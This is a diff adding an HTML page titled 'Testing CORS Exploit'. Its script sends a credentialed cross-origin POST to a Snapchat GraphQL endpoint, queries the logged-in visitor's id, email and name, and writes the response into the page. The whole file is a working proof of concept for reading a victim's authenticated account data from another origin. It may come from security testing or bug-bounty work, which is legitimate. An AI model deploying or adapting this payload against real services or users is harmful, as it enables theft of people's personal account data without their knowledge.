@@ -1,0 +1,25 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Testing CORS Exploit</h1>
+    <script>
+      fetch("https://gcp.api.snapchat.com/gfg/?op=FetchUserInfoQuery", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          "operationName": "FetchUserInfoQuery",
+          "variables": {},
+          "query": "query FetchUserInfoQuery { me { id email name __typename } }"
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.body.innerHTML += "<pre>" + data + "</pre>";
+      });
+    </script>
+  </body>
+</html>
